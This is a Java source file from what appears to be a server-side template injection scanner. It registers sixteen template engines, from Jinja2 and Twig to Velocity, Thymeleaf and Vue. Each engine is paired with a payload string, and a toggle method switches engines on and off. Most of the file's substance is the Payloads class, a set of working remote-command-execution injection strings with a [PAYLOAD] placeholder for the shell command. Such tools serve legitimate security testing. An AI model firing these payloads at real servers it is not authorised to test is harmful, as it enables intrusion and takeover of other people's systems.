package sstiscanner.engines;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Objects;

public class Engines {

    private final List<Engine> engines = new ArrayList<>();

    public Engines() {
        initializeEngines();
    }

    public List<Engine> getEngines() {
        return Collections.unmodifiableList(engines);
    }

    private void initializeEngines() {
        addEngine("Jinja2", Payloads.JINJA2_PAYLOAD);
        addEngine("Twig", Payloads.TWIG_PAYLOAD);
        addEngine("Mako", Payloads.MAKO_PAYLOAD);
        addEngine("Tornado", Payloads.TORNADO_PAYLOAD);
        addEngine("Nunjucks", Payloads.NUNJUCKS_PAYLOAD);
        addEngine("ERB", Payloads.ERB_PAYLOAD);
        addEngine("Slim", Payloads.SLIM_PAYLOAD);
        addEngine("FreeMarker", Payloads.FREEMARKER_PAYLOAD);
        addEngine("Smarty", Payloads.SMARTY_PAYLOAD);
        addEngine("Velocity", Payloads.VELOCITY_PAYLOAD);
        addEngine("Jade", Payloads.JADE_PAYLOAD);
        addEngine("EJS", Payloads.EJS_PAYLOAD);
        addEngine("Thymeleaf", Payloads.THYMELEAF_PAYLOAD);
        addEngine("doT", Payloads.DOT_PAYLOAD);
        addEngine("Razor", Payloads.RAZOR_PAYLOAD);
        addEngine("Vue", Payloads.VUE_PAYLOAD);
    }

    private void addEngine(String name, String payload) {
        engines.add(new Engine(name, payload, true));
    }

    public void toggle(String name) {
        for (Engine engine : engines) {
            if (Objects.equals(engine.name, name)) {
                if (engine.isActivated) {
                    engine.isActivated = false;
                } else {
                    engine.isActivated = true;
                }
                break;
            }
        }
    }

    private static class Payloads {
        static final String JINJA2_PAYLOAD = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"[PAYLOAD]\").read().zfill(417)}}{%endif%}{% endfor %}";
        static final String TWIG_PAYLOAD = "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"[PAYLOAD]\")}}";
        static final String MAKO_PAYLOAD = "${self.module.cache.util.os.system(\"[PAYLOAD]\")}";
        static final String TORNADO_PAYLOAD = "{% import os %}{{ os.popen(\"[PAYLOAD]\").read() }}";
        static final String NUNJUCKS_PAYLOAD = "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('[PAYLOAD]')\")()}}";
        static final String ERB_PAYLOAD = "<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('[PAYLOAD]') %><%= @b.readline()%>";
        static final String SLIM_PAYLOAD = "#{%x( [PAYLOAD] )}";
        static final String FREEMARKER_PAYLOAD = "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"[PAYLOAD]\")}";
        static final String SMARTY_PAYLOAD = "{system('[PAYLOAD]')}";
        static final String VELOCITY_PAYLOAD = "#set($engine=\"\")\n" +
                "#set($run=$engine.getClass().forName(\"java.lang.Runtime\"))\n" +
                "#set($runtime=$run.getRuntime())\n" +
                "#set($proc=$runtime.exec(\"[PAYLOAD]\"))\n" +
                "#set($null=$proc.waitFor())\n" +
                "#set($istr=$proc.getInputStream())\n" +
                "#set($chr=$engine.getClass().forName(\"java.lang.Character\"))\n" +
                "#set($output=\"\")\n" +
                "#set($string=$engine.getClass().forName(\"java.lang.String\"))\n" +
                "#foreach($i in [1..$istr.available()])\n" +
                "#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\n" +
                "#end\n";

        static final String JADE_PAYLOAD = "#{global.process.mainModule.require('child_process').execSync('[PAYLOAD]').toString()}";
        static final String EJS_PAYLOAD = "<%=global.process.mainModule.require('child_process').execSync('[PAYLOAD]').toString()%>";
        static final String THYMELEAF_PAYLOAD = "[[${#rt = @java.lang.Runtime@getRuntime(),#rt.exec(\"[PAYLOAD]\").waitFor()}]]";
        static final String DOT_PAYLOAD = "{{= global.process.mainModule.require('child_process').execSync('[PAYLOAD]').toString() }}";
        static final String RAZOR_PAYLOAD = "@{ System.Diagnostics.Process.Start(\"[PAYLOAD]\"); }";
        static final String VUE_PAYLOAD = "{{constructor.constructor(\"global.process.mainModule.require('child_process').execSync('[PAYLOAD]').toString()\")()}}";
    }
}